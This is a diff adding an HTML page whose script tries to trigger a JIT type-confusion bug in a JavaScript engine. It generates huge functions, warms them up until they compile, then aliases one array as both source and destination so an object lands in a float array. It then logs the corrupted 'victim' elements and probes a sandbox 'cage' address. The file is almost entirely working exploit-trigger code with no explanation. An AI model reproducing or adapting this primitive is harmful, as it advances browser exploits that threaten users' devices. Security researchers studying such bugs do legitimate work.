@@ -1,0 +1,45 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const mutateLines = ["function mutate(a, x) {"];
+mutateLines.push("  a.push({mutated: x});");
+for (let i = 0; i < 650; i++) mutateLines.push(`  if (x === ${i}) return ${i};`);
+mutateLines.push("  return a.length;");
+mutateLines.push("}");
+mutateLines.push("return mutate;");
+const mutate = new Function(mutateLines.join("\n"))();
+
+const lines = ["function trigger(x, src, dst, obj, limit) {"];
+for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
+lines.push("  src[0] = 1.1;");
+lines.push("  mutate(dst, 1);");
+lines.push("  dst[0] = obj;");
+lines.push("  let i = 0, res = 0;");
+lines.push("  while (i < limit) {");
+for (let i = 0; i < 430; i++) lines.push(`    res = (res + i) | 0;`);
+lines.push("    i++;");
+lines.push("  }");
+lines.push("  return res;");
+lines.push("}");
+lines.push("return trigger;");
+const trigger = new Function(lines.join("\n"))();
+
+const obj = {marker: 0x1337};
+function makeSmi() { return [1, 2, 3]; }
+function makeObject() { return [{a: 1}, {a: 2}, {a: 3}]; }
+for (let i = 0; i < 30000; i++) trigger(1000, makeSmi(), makeObject(), obj, 1);
+console.log("warmup complete");
+setTimeout(() => {
+  const victim = makeSmi();
+  try {
+    const result = trigger(1000, victim, victim, obj, 1);
+    console.log("result", typeof result, result);
+    console.log("victim0", typeof victim[0], victim[0]);
+    console.log("victim1", typeof victim[1], victim[1]);
+    console.log("victim2", typeof victim[2], victim[2]);
+    console.log("victim3", typeof victim[3], victim[3]);
+    console.log("victimlen", victim.length);
+    console.log("cage", typeof cageBase === "function" ? "0x" + cageBase().toString(16) : "missing");
+  } catch (e) { console.log("caught", e && e.name, String(e)); }
+}, 2000);
+</script>
